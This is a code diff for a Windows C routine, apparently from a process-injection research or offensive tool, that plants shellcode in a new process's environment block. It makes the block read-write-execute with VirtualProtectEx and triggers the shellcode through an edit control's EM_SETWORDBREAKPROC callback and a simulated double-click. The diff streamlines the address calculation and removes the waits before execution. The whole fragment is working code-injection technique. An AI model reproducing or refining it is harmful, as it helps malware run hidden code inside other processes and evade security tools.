@@ -213,14 +213,10 @@ void var_inject(PWCHAR cmd) {
     SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
     
     // get the address of environment block in new process
+    // then calculate the address of shellcode
     env = var_get_env(pi.hProcess, &len);
-    
-    // get the relative virtual address of shellcode in this process
-    rva = get_var_rva(name);
-    
-    // calculate virtual address of shellcode in new process
-    va = (PBYTE)env + rva;
-    
+    va = (PBYTE)env + get_var_rva(name);
+
     // set environment block to RWX
     if(!VirtualProtectEx(pi.hProcess, env, 
       len, PAGE_EXECUTE_READWRITE, &old)) {
@@ -234,15 +230,8 @@ void var_inject(PWCHAR cmd) {
     printf("Shellcode         : %p\n", va);
     printf("Variable name     : %ws\n", name);
     
-    WaitForInputIdle(pi.hProcess, INFINITE);
-    
+    // execute shellcode
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)va);
-    
-    if(GetSystemMetrics(SM_SWAPBUTTON)) {
-      printf("Mouse buttons are swapped.\n");
-    }
-    
-    WaitForInputIdle(pi.hProcess, INFINITE);
     SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
     
